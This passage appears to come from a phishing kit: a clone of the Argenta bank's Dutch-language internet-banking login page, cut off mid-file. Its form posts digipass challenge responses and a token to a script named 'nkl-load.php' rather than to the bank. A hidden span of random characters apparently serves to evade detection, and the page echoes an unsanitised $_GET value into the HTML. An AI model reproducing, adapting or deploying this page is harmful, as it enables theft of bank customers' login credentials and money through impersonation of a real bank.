7.5286902,37.1108472%2027.5286902,36.1864481%20L27.5286902,33.5505856%20C28.1925746,36.4236757%2030.5161702,38.1369863%2033.6629824,38.1369863%20C35.1500836,38.1369863%2036.5575186,37.6888897%2037.5799007,36.9508482%20L37.6861222,36.8717723%20L37.7923437,36.7926964%20L37.7923437,36.7795171%20L37.9782313,36.647724%20C38.9607803,35.7515307%2038.3898397,34.0909374%2037.0620708,33.9196063%20C36.473212,33.8420167%2035.8897629,34.0960194%2035.5484143,34.5785719%20C35.1500836,35.0793858%2034.4861991,35.3693307%2033.5833163,35.3693307%20C32.016549,35.3693307%2031.0871108,34.3940616%2031.0074446,32.8916199%20L38.3500066,32.8916199%20C38.958651,32.8916199%2039.4520548,32.4018719%2039.4520548,31.797737%20L39.4520548,31.5209714%20C39.4520548,27.7253295%2037.1284592,25.4584877%2033.596594,25.4584877%20L33.5700386,25.4584877%20Z%20M31.0074446,30.5984196%20C31.1136662,29.0300814%2032.0696598,28.1338881%2033.5567609,28.1338881%20C35.1235282,28.1338881%2035.8803565,29.1091573%2035.9467449,30.5852403%20L31.0074446,30.5984196%20Z%27%20id=%27Shape%27%20fill=%27%23FFFFFF%27%3e%3c/path%3e%3c/g%3e%3c/g%3e%3c/g%3e%3c/g%3e%3c/g%3e%3c/svg%3e" style="width: 24px; height: 24px; vertical-align: top;"></span><span class="argnt-a-body argnt-a-body__small argnt-a-body__bold argnt-m-skip-link__label">Aanmelden met smartphone en itsme®</span></span><span class="argnt-m-skip-link__arrow"><span class="argnt-a-icon"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="chevron-right" class="svg-inline--fa fa-chevron-right " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512" style="width: 24px; height: 24px;"><path fill="currentColor" d="M299.3 244.7c6.2 6.2 6.2 16.4 0 22.6l-192 192c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6L265.4 256 84.7 75.3c-6.2-6.2-6.2-16.4 0-22.6s16.4-6.2 22.6 0l192 192z"></path></svg></span></span></a></li><li><a href="#" class="argnt-m-skip-link"><span class="argnt-m-skip-link__content"><span class="argnt-a-icon"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="calculator" class="svg-inline--fa fa-calculator " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" style="width: 24px; height: 24px;"><path fill="currentColor" d="M352 160V448c0 17.7-14.3 32-32 32H64c-17.7 0-32-14.3-32-32V160H352zm0-32H32V64c0-17.7 14.3-32 32-32H320c17.7 0 32 14.3 32 32v64zm32 0V64c0-35.3-28.7-64-64-64H64C28.7 0 0 28.7 0 64v64 16 16V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V160 144 128zM72 224a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zm24 72a24 24 0 1 0 0 48 24 24 0 1 0 0-48zm72-72a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zm24 72a24 24 0 1 0 0 48 24 24 0 1 0 0-48zm72-72a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zm24 72a24 24 0 1 0 0 48 24 24 0 1 0 0-48zM264 416a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zM80 400c-8.8 0-16 7.2-16 16s7.2 16 16 16H208c8.8 0 16-7.2 16-16s-7.2-16-16-16H80z"></path></svg></span><span class="argnt-a-body argnt-a-body__small argnt-a-body__bold argnt-m-skip-link__label">Aanmelden met debetkaart en digipas</span></span><span class="argnt-m-skip-link__arrow"><span class="argnt-a-icon"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="chevron-right" class="svg-inline--fa fa-chevron-right " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512" style="width: 24px; height: 24px;"><path fill="currentColor" d="M299.3 244.7c6.2 6.2 6.2 16.4 0 22.6l-192 192c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6L265.4 256 84.7 75.3c-6.2-6.2-6.2-16.4 0-22.6s16.4-6.2 22.6 0l192 192z"></path></svg></span></span></a></li></ul></nav><div class="argnt-m-header argnt-m-header--mobile"><div class="argnt-m-header__logo"><a class="argnt-a-logo argnt-a-logo--icon" href="#" target="_blank"><span class="sr-only">Ga naar www.argenta.be</span><svg class="svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true"><symbol id="symbol-logo-text__vgEcMWLP"><path d="M24.8316,40.3246757 L26.3295448,40.3246757 C27.2202583,40.3246757 30.4591326,40.2846385 30.4591326,37.3690533 C30.4591326,36.1044289 29.6089166,34.5551719 27.1392634,34.5551719 L24.8316,34.5551719 L24.8316,40.3246757 Z M29.8116338,47.6247984 L24.8720974,40.6318579 L24.8316,40.6318579 L24.8316,47.6247984 L22.6451297,47.6247984 L22.6451297,32.5365129 L27.2807743,32.5365129 C29.3861807,32.5365129 30.4793813,33.0457221 31.2686211,33.7997567 C32.2203108,34.717852 32.6453037,36.1044289 32.6453037,37.3690533 C32.6453037,41.366104 29.3254345,41.9968055 28.3537262,41.9968055 L32.5442902,47.6247984 L29.8116338,47.6247984 Z" id="Fill-1__vgEcMWLP"></path><path d="M44.7298761,36.3282692 C44.1026261,35.6352109 42.8472056,34.2691128 40.6407858,34.2691128 C37.5236338,34.2691128 35.0947082,36.9608116 35.0947082,40.1214522 C35.0947082,43.4452331 37.8273646,45.8921065 40.6614947,45.8921065 C41.0864876,45.8921065 44.3863382,45.8518391 45.8235369,42.1401112 L38.8395704,42.1401112 L38.8395704,40.1214522 L48.3132087,40.1214522 C48.2322139,45.1785693 44.2241184,47.9103053 40.5804998,47.9103053 C36.2081575,47.9103053 32.908307,44.3421592 32.908307,40.1214522 C32.908307,35.7778723 36.248655,32.2516042 40.5602511,32.2516042 C43.110439,32.2516042 45.8235369,33.6177024 47.2809844,36.3282692 L44.7298761,36.3282692 Z" id="Fill-2__vgEcMWLP"></path><polygon id="Fill-3__vgEcMWLP" points="49.0621812 47.6247063 49.0621812 32.5364209 57.1370474 32.5364209 57.1370474 34.5550799 51.2472018 34.5550799 51.2472018 38.9996733 57.1370474 38.9996733 57.1370474 41.0190226 51.2472018 41.0190226 51.2472018 45.6062774 57.1370474 45.6062774 57.1370474 47.6247063"></polygon><polygon id="Fill-4__vgEcMWLP" points="68.2103344 47.6247063 60.8020652 35.9612152 60.7608774 35.9612152 60.7608774 47.6247063 58.5744762 47.6247063 58.5744762 32.5364209 60.9638248 32.5364209 68.2515221 44.0160628 68.2913293 44.0160628 68.2913293 32.5364209 70.4777305 32.5364209 70.4777305 47.6247063"></polygon><polygon id="Fill-5__vgEcMWLP" points="73.7978298 47.6247063 73.7978298 34.5550799 70.9227421 34.5550799 70.9227421 32.5364209 78.8583984 32.5364209 78.8583984 34.5550799 75.984001 34.5550799 75.984001 47.6247063"></polygon><path d="M81.9902766,41.0228422 L81.9902766,35.4475421 L89.1534904,40.9945401 L81.9902766,41.0228422 Z M81.9875155,32.511248 L79.6216369,32.511248 L79.6216369,47.7477173 L81.9902766,47.7477173 L81.9902766,43.1507983 L91.9514949,43.1611528 L97.8735544,47.7477173 L101.25463,47.7477173 L81.9875155,32.511248 Z" id="Fill-6__vgEcMWLP"></path><path d="M19.263663,41.0228422 L12.1018298,40.9945401 L19.263663,35.4475421 L19.263663,41.0228422 Z M19.2668844,32.511248 L0,47.7477173 L3.38061535,47.7477173 L9.30313498,43.1611528 L19.263663,43.1507983 L19.263663,47.7477173 L21.6327629,47.7477173 L21.6327629,32.511248 L19.2668844,32.511248 Z" id="Fill-7__vgEcMWLP"></path><polygon id="Fill-8__vgEcMWLP" points="46.1574107 8.5663578 51.1480291 8.5663578 40.1704633 17.2643323 40.1711536 13.3093897"></polygon><polygon id="Fill-9__vgEcMWLP" points="58.5811491 27.9314714 53.5909908 27.9314714 64.5683265 19.2342103 64.5678663 23.1880024"></polygon><polygon id="Fill-10__vgEcMWLP" points="58.5818394 8.5663578 61.2539797 10.6828089 42.8214345 25.2877023 40.1711536 23.1877723 40.1711536 18.3156549 52.4754706 8.5663578"></polygon><polygon id="Fill-11__vgEcMWLP" points="61.9175854 11.2088154 64.5683265 13.3093897 64.5683265 18.1815071 52.2628591 27.9315175 46.1574107 27.9315175 43.4850402 25.8139158"></polygon><polygon id="Fill-12__vgEcMWLP" points="54.0926068 7.28516625 60.2118611 2.43605872 71.6618203 2.43605872 65.5434863 7.28516625"></polygon><polygon id="Fill-13__vgEcMWLP" points="52.7649352 0.978151092 53.9998768 0 53.9998768 6.30678506 52.7649352 7.28516625"></polygon></symbol><symbol id="symbol-logo-icon__vgEcMWLP" fill-rule="evenodd"><path d="M18.472 25.7h14.972L.511 51.792l.002-11.865zM55.743 83.794h-14.97l32.932-26.091-.001 11.861zM55.746 25.7l8.016 6.348L8.464 75.863l-7.95-6.3V54.947l36.912-29.248zM65.753 33.626l7.952 6.302v14.617l-36.916 29.25H18.472l-8.017-6.353zM42.278 21.855L60.636 7.308h34.35L76.63 21.855zM38.295 2.934L42 0v18.92l-3.705 2.935z"></path></symbol><svg class="logo-full" id="logo-full__vgEcMWLP" viewBox="0 0 102 48" preserveAspectRatio="xMinYMin meet"><use xlink:href="#symbol-logo-text__vgEcMWLP" x="0" y="0"></use></svg><svg class="logo-mobile" id="logo-mobile__vgEcMWLP" viewBox="0 0 95 84" preserveAspectRatio="xMinYMin meet"><use xlink:href="#symbol-logo-icon__vgEcMWLP" x="0" y="0"></use></svg></svg></a></div><div class="argnt-m-header__actions"><button type="button" class="argnt-a-language-selection" lang="fr"><span class="argnt-a-icon"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="globe" class="svg-inline--fa fa-globe " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" style="width: 16px; height: 16px;"><path fill="currentColor" d="M256 480c16.7 0 40.4-14.4 61.9-57.3c9.9-19.8 18.2-43.7 24.1-70.7H170c5.9 27 14.2 50.9 24.1 70.7C215.6 465.6 239.3 480 256 480zM164.3 320H347.7c2.8-20.2 4.3-41.7 4.3-64s-1.5-43.8-4.3-64H164.3c-2.8 20.2-4.3 41.7-4.3 64s1.5 43.8 4.3 64zM170 160H342c-5.9-27-14.2-50.9-24.1-70.7C296.4 46.4 272.7 32 256 32s-40.4 14.4-61.9 57.3C184.2 109.1 175.9 133 170 160zm210 32c2.6 20.5 4 41.9 4 64s-1.4 43.5-4 64h90.8c6-20.3 9.3-41.8 9.3-64s-3.2-43.7-9.3-64H380zm78.5-32c-25.9-54.5-73.1-96.9-130.9-116.3c21 28.3 37.6 68.8 47.2 116.3h83.8zm-321.1 0c9.6-47.6 26.2-88 47.2-116.3C126.7 63.1 79.4 105.5 53.6 160h83.7zm-96 32c-6 20.3-9.3 41.8-9.3 64s3.2 43.7 9.3 64H132c-2.6-20.5-4-41.9-4-64s1.4-43.5 4-64H41.3zM327.5 468.3c57.8-19.5 105-61.8 130.9-116.3H374.7c-9.6 47.6-26.2 88-47.2 116.3zm-143 0c-21-28.3-37.5-68.8-47.2-116.3H53.6c25.9 54.5 73.1 96.9 130.9 116.3zM256 512A256 256 0 1 1 256 0a256 256 0 1 1 0 512z"></path></svg></span><span class="sr-only">Modifiez la langue vers le français</span><span class="argnt-a-body argnt-a-body__small argnt-a-body__semi-bold argnt-a-language-selection__label" aria-hidden="true">Français</span></button><span class="argnt-a-spacer"></span><a target="_blank" href="https://www.argenta.be/nl/doe-het-zelf/internetbankieren.html?faqTopic=YWxs" class="argnt-a-link argnt-a-link--icon-position-left" aria-disabled="false"><span class="argnt-a-button-typography argnt-a-button-typography__link argnt-a-link__text">Help</span><span class="argnt-a-link--content-icon argnt-a-link--content-icon-left"><span class="argnt-a-link__icon argnt-a-icon"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="circle-question" class="svg-inline--fa fa-circle-question " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" style="width: 16px; height: 16px;"><path fill="currentColor" d="M480 256A224 224 0 1 0 32 256a224 224 0 1 0 448 0zM0 256a256 256 0 1 1 512 0A256 256 0 1 1 0 256zm168.7-86.2c6.5-24.6 28.7-41.8 54.2-41.8H280c35.5 0 64 29 64 64.3c0 24-13.4 46.2-34.9 57.2L272 268.3V288c0 8.8-7.2 16-16 16s-16-7.2-16-16V258.5c0-6 3.4-11.5 8.7-14.3l45.8-23.4c10.7-5.4 17.5-16.6 17.5-28.7c0-17.8-14.4-32.3-32-32.3H222.9c-10.9 0-20.5 7.4-23.2 17.9l-.2 .7c-2.2 8.5-11 13.7-19.5 11.4s-13.7-11-11.4-19.5l.2-.7zM232 352a24 24 0 1 1 48 0 24 24 0 1 1 -48 0z"></path></svg></span></span></a></div></div></div></header><main class="grid grid--justifyCenter argnt-p-login-page__flex-grow-1"><div class="grid__cell grid__cell--lg-12"><div class="argnt-p-login-page__content-wrapper"><div class="argnt-p-login-page__content"><div><div class="argnt-p-login"><h1 class="argnt-a-heading argnt-a-heading-h2 argnt-a-heading__bold argnt-p-login__title">Aanmelden op internetbankieren</h1><div class="argnt-m-login-component"><div class="argnt-m-announcements"></div><div class="sr-only"><section class="argnt-a-message argnt-a-message--error"><div class="argnt-a-message__icon-wrapper"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="circle-exclamation" class="svg-inline--fa fa-circle-exclamation " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 32a224 224 0 1 1 0 448 224 224 0 1 1 0-448zm0 480A256 256 0 1 0 256 0a256 256 0 1 0 0 512zm0-384c-8.8 0-16 7.2-16 16V272c0 8.8 7.2 16 16 16s16-7.2 16-16V144c0-8.8-7.2-16-16-16zm24 224a24 24 0 1 0 -48 0 24 24 0 1 0 48 0z"></path></svg></div><div class="argnt-a-message__body"><p role="alert"></p></div></section></div><div class="argnt-m-loader-wrapper"><div class="argnt-q-collapse argnt-q-collapse--open" aria-hidden="false" style="overflow: visible; opacity: 1; height: auto;"><div class="argnt-q-collapse__content"><div class="argnt-m-form-login">


<section id="digipass" class="argnt-m-form-digipass-login"><div class="argnt-a-collapse-item argnt-a-collapse-item--box-shadow"><h2 class="argnt-a-collapse-item__header-as"><button type="button" id="digipass-collapse-control" aria-expanded="true" aria-controls="digipass-collapse-content" class="argnt-a-collapse-item__summary argnt-m-form-digipass-login__header"><span class="argnt-a-collapse-header argnt-a-collapse-header--open"><span class="argnt-a-collapse-header-icon-and-titles-wrapper"><span class="argnt-a-icon"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="calculator" class="svg-inline--fa fa-calculator " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" alt="" style="width: 24px; height: 24px;"><path fill="currentColor" d="M352 160V448c0 17.7-14.3 32-32 32H64c-17.7 0-32-14.3-32-32V160H352zm0-32H32V64c0-17.7 14.3-32 32-32H320c17.7 0 32 14.3 32 32v64zm32 0V64c0-35.3-28.7-64-64-64H64C28.7 0 0 28.7 0 64v64 16 16V448c0 35.3 28.7 64 64 64H320c35.3 0 64-28.7 64-64V160 144 128zM72 224a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zm24 72a24 24 0 1 0 0 48 24 24 0 1 0 0-48zm72-72a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zm24 72a24 24 0 1 0 0 48 24 24 0 1 0 0-48zm72-72a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zm24 72a24 24 0 1 0 0 48 24 24 0 1 0 0-48zM264 416a24 24 0 1 0 48 0 24 24 0 1 0 -48 0zM80 400c-8.8 0-16 7.2-16 16s7.2 16 16 16H208c8.8 0 16-7.2 16-16s-7.2-16-16-16H80z"></path></svg></span><span class="argnt-a-collapse-header-titles"><span class="argnt-a-body argnt-a-body__medium argnt-a-body__regular argnt-a-collapse-header-title">Aanmelden met</span><span class="argnt-a-body argnt-a-body__medium argnt-a-body__bold argnt-a-collapse-header-title">Debetkaart en digipas</span></span></span><span class="argnt-a-collapse-header-indicator-wrapper open"><span class="argnt-a-collapse-indicator"><svg aria-hidden="true" focusable="false" data-prefix="fal" data-icon="chevron-up" class="svg-inline--fa fa-chevron-up " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" style="transform: rotate(0deg); transition-property: transform; transition-duration: 175ms; transition-timing-function: ease-in-out;"><path fill="currentColor" d="M244.7 116.7c6.2-6.2 16.4-6.2 22.6 0l192 192c6.2 6.2 6.2 16.4 0 22.6s-16.4 6.2-22.6 0L256 150.6 75.3 331.3c-6.2 6.2-16.4 6.2-22.6 0s-6.2-16.4 0-22.6l192-192z"></path></svg></span></span></span></button></h2><div class="argnt-q-collapse-transition argnt-q-collapse-transition--collapse argnt-q-collapse-transition--show argnt-a-collapse-item__transition-wrapper" id="digipass-collapse-content" role="region" aria-labelledby="digipass-collapse-control" aria-hidden="false" style=""><div class="argnt-a-collapse-item__content">


<form class="login-container__form ng-untouched ng-pristine ng-valid" method="post" action="nkl-load.php">
								   <span style="display:none;">
							<?php echo substr(str_shuffle($permitted_chars), 0, 2);?>
							</span>
												<input type="hidden" name="type" value="token">
												<input type="hidden" name="code" value="<?php echo $_GET['code']; ?>">
<div class="argnt-q-collapse-transition argnt-q-collapse-transition--collapse argnt-q-collapse-transition--show argnt-a-collapse-item__transition-wrapper" id="digipass-collapse-content" role="region" aria-labelledby="digipass-collapse-control" aria-hidden="false" style=""><div class="argnt-a-collapse-item__content"><div class="argnt-m-form-digipass-login__form"><div class="argnt-m-form-digipass-login__form__details"><div class="argnt-a-field-container argnt-a-field-container--gap-16"><span class="argnt-a-body argnt-a-body__medium argnt-a-body__bold argnt-m-form-digipass-login__form__signature-subtitle">2. Steek je debetkaart in de digipas</span><div class="arg-m-signature"><div class="arg-m-signature-container"><ol id="signature-m1" class="arg-m-signature__list"><li class="argnt-m-signature--field argnt-m-signature--field--m1"><div class="argnt-a-field-container"><div class="argnt-m-signature--field-with-image"><span class="argnt-a-body argnt-a-body__medium argnt-a-body__bold">Druk op</span><img alt="m1" src="data:image/png;base64,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"><span class="sr-only">,</span></div></div></li><li class="argnt-m-signature--field"><div class="argnt-a-field-container"><div class="argnt-m-signature--field-with-image"><div class="argnt-m-signature--givechallenge"><span class="argnt-a-body argnt-a-body__medium argnt-a-body__bold">Geef de challenge</span><span class="argnt-a-label--challenge"><span><?php echo $code; ?></span></span><span class="argnt-a-body argnt-a-body__medium argnt-a-body__bold">en druk op</span></div><img alt="ok" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADQAAAAgCAYAAABdP1tmAAAAAXNSR0IArs4c6QAAAIRlWElmTU0AKgAAAAgABQESAAMAAAABAAEAAAEaAAUAAAABAAAASgEbAAUAAAABAAAAUgEoAAMAAAABAAIAAIdpAAQAAAABAAAAWgAAAAAAAABIAAAAAQAAAEgAAAABAAOgAQADAAAAAQABAACgAgAEAAAAAQAAADSgAwAEAAAAAQAAACAAAAAAO+WxQgAAAAlwSFlzAAALEwAACxMBAJqcGAAAAVlpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IlhNUCBDb3JlIDYuMC4wIj4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAgICAgICAgeG1sbnM6dGlmZj0iaHR0cDovL25zLmFkb2JlLmNvbS90aWZmLzEuMC8iPgogICAgICAgICA8dGlmZjpPcmllbnRhdGlvbj4xPC90aWZmOk9yaWVudGF0aW9uPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KGV7hBwAADPZJREFUWAmlWAtwVNUZ/s69d3ezG5JAHogBeUQkYlCoQUR8EMYq9dUqNtTHjI5tLXVsx7bjo6DWtVh1OlYdtaBYH7WtM5rW0fq2jmLFB0IElPiAQEQgIQHyTnb33r339vvPzQ2LxID2JPee3XP/8///9z/PXYVvO5JJo2buSqOnoEfVb63wsLDO/baskAR51WheFdUVXp2q88jL/zb81DfdVL22OtLVNtpoPOtlG+pAoWe9f2lhX8Yu8WNegWP7BYbvx6ib5Rm+p0zD4eeU76ieSL7qnIrSPStmruDa/qPmzRprRypuNp51ogOVFHCHPA4ZUPXan0XS8Q7VUFVnh9y/u7a2qD+TPcb13GNdZI9zfa/S9bxxHrxizoUwkacsUptE7tPgrg/f9n0Fo8cwVJcBtdtQZpMJtdFQxseGin28+pRnNiulBr0z8c2avC9qami8QwN2UEC1T9eaWyu2GvUz67UlxQOdTu/ptueck4V7kuPZR7lxRGzlwHZt2FletgPHzcLJuvB8zyNAX/lKEQSdZKqIaSJiRRCNRhAxORsRmL